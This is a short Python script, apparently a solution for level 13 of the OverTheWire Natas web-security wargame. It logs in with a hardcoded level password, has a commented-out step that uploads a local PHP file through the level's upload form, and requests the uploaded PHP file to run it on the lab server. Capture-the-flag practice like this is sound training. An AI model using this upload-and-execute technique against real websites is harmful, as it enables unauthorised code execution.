import requests
import re #regular expressions

username = "natas13"
password = "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"

url = 'http://%s.natas.labs.overthewire.org/upload/ltgloxi8q8.php' % username
file = {"uploadedfile":open("Natas 13.php","rb")}
data = {"filename":"Natas 13.php"}

session = requests.Session() #Maintains a session
#response = session.post(url , auth=(username, password),files=file,data=data)
response = session.get(url, auth = (username,password))
content = response.text

print (content)
#print (re.findall("natas12 is (.*)<br>",content)[0])
